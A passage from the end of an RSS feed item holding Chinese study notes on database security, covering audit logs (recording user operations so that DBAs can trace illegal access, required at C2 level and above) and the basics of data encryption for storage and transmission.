&lt;p&gt;将用户对数据库的所有操作记录都在上面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DBA 利用审计日记&lt;/p&gt;
&lt;p&gt;找出非法存取数据的人，时间和内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C2 以上安全级别的 DBMS 必须具有&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;数据加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据加密&#34;&gt;#&lt;/a&gt; 数据加密&lt;/h2&gt;
&lt;p&gt;数据加密&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防止数据库中数据在存储和传输中失密的有效手段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;加密的基本思想&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据一定的算法将原始数据（明文）变换为不可直接识别的格式（密文）, 从而使得不知道解密算法的人无法获知数据的内容.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据加密分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存储加密&lt;/li&gt;
&lt;li&gt;传输加密&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
